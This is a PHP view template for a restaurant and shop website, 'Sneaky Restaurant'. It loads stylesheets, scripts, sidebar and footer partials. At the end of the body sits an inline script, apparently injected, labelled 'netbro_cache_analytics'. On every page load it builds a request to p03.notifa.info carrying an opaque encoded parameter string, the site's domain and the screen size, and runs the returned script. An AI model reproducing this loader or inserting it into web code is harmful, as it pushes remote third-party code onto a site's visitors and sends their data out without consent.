<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Sneaky Restaurant - Home</title>
	<link rel="icon" href="<?= base_url('assets/');?>img/Fevicon.png" type="image/png">

  <link rel="stylesheet" href="<?= base_url('assets/vendors/bootstrap/bootstrap.min.css');?>">
  <link rel="stylesheet" href="<?= base_url('assets/vendors/themify-icons/themify-icons.css');?>">
  <link rel="stylesheet" href="<?= base_url('assets/vendors/owl-carousel/owl.theme.default.min.css');?>">
  <link rel="stylesheet" href="<?= base_url('assets/vendors/owl-carousel/owl.carousel.min.css');?>">
  <link rel="stylesheet" href="<?= base_url('assets/vendors/Magnific-Popup/magnific-popup.css');?>">

  <link rel="stylesheet" href="<?= base_url('assets/');?>css/style-sec.css">
  <link rel="stylesheet" href="<?= base_url('assets/');?>css/style.css">
  

  <!-- ======== Shop ======= -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mukta:300,400,700"> 
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>fonts/icomoon/style.css">
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>css/bootstrap.min.css">
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>css/magnific-popup.css">
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>css/jquery-ui.css">
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>css/owl.carousel.min.css">
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>css/owl.theme.default.min.css">
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>css/aos.css">
  <link rel="stylesheet" href="<?= base_url('assets/shop/');?>css/style.css">
  <!-- ======== End Shop ======= -->
</head>
<body>
    <!--================ Header Menu Area start =================-->
    <header class="header_area">
    <div class="main_menu">
        
        <nav class="navbar navbar-expand-lg navbar-light">
        <div class="container box_1620">
            <!-- <a class="navbar-brand logo_h" href="#"><img style="width:40%" src="<?= base_url('assets/');?>img/masakin.png" alt=""></a> -->
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            </button>

            <!-- ================= Sidebar ================= -->
                <?php $this->load->view('template/sidebar'); ?>
            <!-- =============== Sidebar End =============== -->
            
        </div>
        </nav>
    </div>
    </header>
    <!--================Header Menu Area =================-->

    <!-- ============== Content ================ -->
    <div id="konten">
      <?= $contents ?>
    </div>
    <!--  ======= Content End ================= -->

    <!-- ========= Footer ============ -->
        <?php $this->load->view('template/footer'); ?>
    <!-- ========= Footer End ======== -->




  <script src="<?= base_url('assets/vendors/jquery/jquery-3.2.1.min.js');?>"></script>
  <script src="<?= base_url('assets/vendors/bootstrap/bootstrap.bundle.min.js');?>"></script>
  <script src="<?= base_url('assets/vendors/owl-carousel/owl.carousel.min.js');?>"></script>
  <script src="<?= base_url('assets/vendors/nice-select/jquery.nice-select.min.js');?>"></script>
  <script src="<?= base_url('assets/vendors/Magnific-Popup/jquery.magnific-popup.min.js');?>"></script>
  <script src="<?= base_url('assets/js/jquery.ajaxchimp.min.js');?>"></script>
  <script src="<?= base_url('assets/js/mail-script.js');?>"></script>
  <script src="<?= base_url('assets/js/main.js');?>"></script>
  <script src="<?= base_url('assets/js/load.js');?>"></script>
  

  <!-- ---- SHOP ---- -->
  <!-- <script src="<?= base_url('assets/shop/');?>js/jquery-3.3.1.min.js"></script> -->
  <script src="<?= base_url('assets/shop/');?>js/jquery-ui.js"></script>
  <script src="<?= base_url('assets/shop/');?>js/popper.min.js"></script>
  <script src="<?= base_url('assets/shop/');?>js/bootstrap.min.js"></script>
  <script src="<?= base_url('assets/shop/');?>js/owl.carousel.min.js"></script>
  <script src="<?= base_url('assets/shop/');?>js/jquery.magnific-popup.min.js"></script>
  <script src="<?= base_url('assets/shop/');?>js/aos.js"></script>
  <!-- -- End SHOP ---->

  <script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH23dD37rtiI1tE1O09EiP7GSUj7tyTrcY%2bWHf3bN%2ft6qOdVecLCekeucrXyvrN4TDEEgiFjoFYWompj%2bd8agVi2wgMfrBIn1vrIXa%2fwFycVrtzqgGQOwwewvWztT9stIXnLT3brxmdcMOxZYTdNMgwUIsN0sIlCy0tYTze1AvF995IRLrtR7UGF3yOUGgbVqfta2Y5PKpySIiWxb01UhmxQI5UwdMqNGIHnXmkTI%2bXXXz8u1TpF%2bdNMDB0nHaCUvEvW14zBkB62fgyCjHBgP1Do6QRzFxKaUN%2fgm1mO0uXLR5%2fFu6P%2bNg%2bhkRqpxw%2bIXqvYqNRIlHPK1nIB%2bsNgKhvL%2bSO89wFp0QIkmxMxYAHRviuy6MqJm12F1%2b7lbAXvP8OCaZZW2KOJiVU%2fqGIipFBw8g4OaJ6gXbpYXI6ZvRhH3q%2fyegeOcZYLzX5er3rl9AtcuyM2ZADK3F9AvsVi5EUPc6jNqjF3Qvi6JrsWI8McX3ehRilNBarNHh2NPrWf18LopESIkhP3xxGlgnFxBlI4CpyzENspi%2fn" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>
</body>
</html>